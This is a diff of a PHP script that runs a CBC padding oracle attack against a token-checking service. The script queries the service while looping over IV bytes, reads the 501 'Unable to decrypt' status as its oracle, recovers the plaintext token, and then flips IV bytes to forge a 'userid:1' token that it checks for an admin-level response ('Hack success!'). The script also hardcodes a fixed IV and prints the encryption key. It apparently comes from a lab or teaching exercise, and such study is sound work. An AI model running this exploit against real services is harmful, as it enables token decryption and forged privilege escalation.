@@ -79,6 +79,11 @@ function create_token () {
 
 	# This gives a string of 16 random bytes
 	$iv_string = random_bytes(16);
+	$iv_string = "1234567812345678";
+
+	print "Token: " . $token . "\n";
+	print "Encryption key: " . KEY . "\n";
+	print "Encryption IV: " . bin2hex ($iv_string) . "\n";
 
 	$e = encrypt ($token, $iv_string);
 	$data = array (
@@ -87,18 +92,6 @@ function create_token () {
 				);
 	return json_encode($data);
 }
-
-$t = json_decode (create_token(), true);
-var_dump ($t);
-$token = $t['token'];
-$iv_string_b64 = $t['iv'];
-$iv_string = base64_decode ($iv_string_b64);
-$iv = unpack('C*', $iv_string);
-
-$o = make_call ($token, $iv);
-
-var_dump ($o);
-exit;
 
 function make_call ($token, $iv) {
 	# This maps the IV byte array down to a string
@@ -128,11 +121,10 @@ function check_token ($data) {
 	} catch (TypeError $exp) {
 		$ret = array (
 						"status" => 503,
-						"message" => "Data in wrong format",
+						"message" => "Data not in JSON format",
 						"extra" => $exp->getMessage()
 					);
 	}
-	var_dump ($data_array);
 
 	if ($data_array === false) {
 		$ret = array (
@@ -143,6 +135,7 @@ function check_token ($data) {
 		$ciphertext = base64_decode ($data_array['token']);
 		$iv = base64_decode ($data_array['iv']);
 
+		# Asssume failure
 		$ret = array (
 						"status" => 500,
 						"message" => "Unknown error"
@@ -165,7 +158,7 @@ function check_token ($data) {
 								);
 				}
 			}
-		} catch(Exception $exp) {
+		} catch (Exception $exp) {
 			$ret = array (
 							"status" => 501,
 							"message" => "Unable to decrypt token",
@@ -211,18 +204,26 @@ exit;
 
 */
 
-$init_iv = [1,2,3,4,5,6,7,8,1,2,3,4,5,6,7,8];
-$clear = "hello";
-$clear = "hello world";
-$clear = "u:123 l:0";
-print "Clear text: " . $clear . "\n";
-print "Encryption key: " . KEY . "\n";
-print "Encryption IV: " . byte_array_to_string ($init_iv) . "\n";
-
-$e = encrypt ($clear, $init_iv);
+print "Creating the token\n";
 print "\n";
 
+$token_data = json_decode (create_token(), true);
+var_dump ($token_data);
+
+$token = $token_data['token'];
+$iv_string_b64 = $token_data['iv'];
+$iv_string = base64_decode ($iv_string_b64);
+$temp_init_iv = unpack('C*', $iv_string);
+
+# The unpack creates an array starting a 1, the
+# rest of this code assumes an array starting at 0
+# so calling array_values changes the array 0 based
+
+$init_iv = array_values ($temp_init_iv);
+
+print "\n";
 print "Trying to decrypt\n";
+print "\n";
 
 $iv = zero_array(16);
 $zeroing = zero_array(16);
@@ -236,58 +237,75 @@ for ($padding = 1; $padding <= 16; $padding++) {
 			$iv[$k] = $zeroing[$k] ^ $padding;
 		}
 		try {
-			# print "IV: " . bin2hex($iv) . "\n";
-			$d = check_token ($e, $iv);
+			$d = make_call ($token, $iv);
 
-			# Only get here if the decrypt works correctly
+			$obj = json_decode ($d, true);
 
-			/*
+			# 501 is decryption failed
+			if ($obj['status'] != 501) {
+				print "Got hit for: " . $i . "\n";
 
-			Check for edge case on offset 15 (right most byte).
-			The decrypted data could look like this:
+				# Only get here if the decrypt works correctly
 
-			0x44 ... 0x02 0x02
-						  ^^^^ Real last byte of value 2 byte padding
+				/*
 
-			In this situation, if we happen to land on a value 
-			that sets the last byte to 0x02 then that will
-			look like valid padding as it will make the data end
-			in 0x02 0x02 as it already does:
+				Check for edge case on offset 15 (right most byte).
+				The decrypted data could look like this:
 
-			0x44 ... 0x02 0x02
-						  ^^^^ Fluke, we want 0x01 for 1 byte padding
+				0x44 ... 0x02 0x02
+							  ^^^^ Real last byte of value 2 byte padding
 
-			This is what we want:
+				In this situation, if we happen to land on a value 
+				that sets the last byte to 0x02 then that will
+				look like valid padding as it will make the data end
+				in 0x02 0x02 as it already does:
 
-			0x44 ... 0x02 0x01
-						  ^^^^ Valid 1 byte padding
+				0x44 ... 0x02 0x02
+							  ^^^^ Fluke, we want 0x01 for 1 byte padding
 
-			To do this, change the IV value for offset 14 which will
-			change the second to last byte and make the call again.
-			If we were in the edge case we would now have:
+				This is what we want:
 
-			0x44 ... 0xf3 0x02
-						  ^^^^ No longer valid padding
+				0x44 ... 0x02 0x01
+							  ^^^^ Valid 1 byte padding
 
-			This is no longer valid padding so it will fail and we can 
-			continue looking till we find the value that gives us
-			valid 1 byte padding.
+				To do this, change the IV value for offset 14 which will
+				change the second to last byte and make the call again.
+				If we were in the edge case we would now have:
 
-			*/
+				0x44 ... 0xf3 0x02
+							  ^^^^ No longer valid padding
 
-			if ($offset == 15) {
-				print "Got a valid decrypt for offset 15, checking edge case\n";
-				$temp_iv = $iv;
-				$temp_iv[14] = 0xff;
-				$temp_d = check_token ($e, $temp_iv);
-				print "Not edge case, can continue\n";
+				This is no longer valid padding so it will fail and we can 
+				continue looking till we find the value that gives us
+				valid 1 byte padding.
+
+				*/
+
+				// Used by the edge case check
+
+				$ignore = false;
+				if ($offset == 15) {
+					print "Got a valid decrypt for offset 15, checking edge case\n";
+					$temp_iv = $iv;
+					$temp_iv[14] = 0xff;
+					$temp_d = make_call ($token, $temp_iv);
+					$temp_d_obj = json_decode ($temp_d, true);
+					if ($temp_d_obj['status'] != 501) {
+						print "Not edge case, can continue\n";
+					} else {
+						print "Edge case, do not continue\n";
+						$ignore = true;
+					}
+				}
+				
+				if (!$ignore) {
+					print "There was a match\n";
+					$zeroing[$offset] = $i ^ $padding; 
+					# print "IV: " . byte_array_to_string ($iv) . "\n";
+					# print "Zero: " . byte_array_to_string ($zeroing) . "\n";
+					break;
+				}
 			}
-
-			print "There was a match\n";
-			$zeroing[$offset] = $i ^ $padding; 
-			# print "IV: " . byte_array_to_string ($iv) . "\n";
-			# print "Zero: " . byte_array_to_string ($zeroing) . "\n";
-			break (1);
 		} catch(Exception $exp) {
 			# print "Fail\n";
 			# var_dump ($e);
@@ -296,11 +314,14 @@ for ($padding = 1; $padding <= 16; $padding++) {
 }
 
 print "\n";
+print "Finished looping\n";
+print "\n";
+
 print "Derived IV is: " . byte_array_to_string ($iv) . "\n";
 
 # If you want to check this, it should be all 16 to show it is all padding
-#$x = xor_byte_array ($iv, $zeroing);
-#print "Derived IV XOR and zeroing string: " . byte_array_to_string ($x) . "\n";
+# $x = xor_byte_array ($iv, $zeroing);
+# print "Derived IV XOR and zeroing string: " . byte_array_to_string ($x) . "\n";
 
 print "Real IV is: " . byte_array_to_string ($init_iv) . "\n";
 print "Zeroing array is: " . byte_array_to_string ($zeroing) . "\n";
@@ -323,7 +344,6 @@ for ($i = 0; $i < count ($without_padding); $i++) {
 }
 
 print "Decrypted string as text: " . $str . "\n";
-print "\n";
 
 /*
 Trying to modify decrypted data by playing with the zeroing array.
@@ -331,8 +351,9 @@ Trying to modify decrypted data by playing with the zeroing array.
 
 print "\n";
 print "Trying to modify string\n";
+print "\n";
 
-$new_clear = "u:1 l:1";
+$new_clear = "userid:1";
 print "New clear text: " . $new_clear . "\n";
 
 for ($i = 0; $i < strlen($new_clear); $i++) {
@@ -348,11 +369,18 @@ print "New IV is: " . byte_array_to_string ($zeroing) . "\n";
 
 print "Sending new data to server\n";
 
-$result = check_token ($e, $zeroing);
-print $result . "\n";
+try {
+	$result = make_call ($token, $zeroing);
+	$ret_obj = json_decode ($result, true);
 
-if (strpos ($result, "admin") === false) {
-	print "Hack failed\n";
-} else {
-	print "Hack success!\n";
+	var_dump ($ret_obj);
+
+	if ($ret_obj['status'] == 200 && $ret_obj['level'] == "admin") {
+		print "Hack success!\n";
+	} else {
+		print "Hack failed\n";
+	}
+} catch (Exception $exp) {
+	print "Hack failed, system could not decrypt message\n";
+	var_dump ($exp);
 }
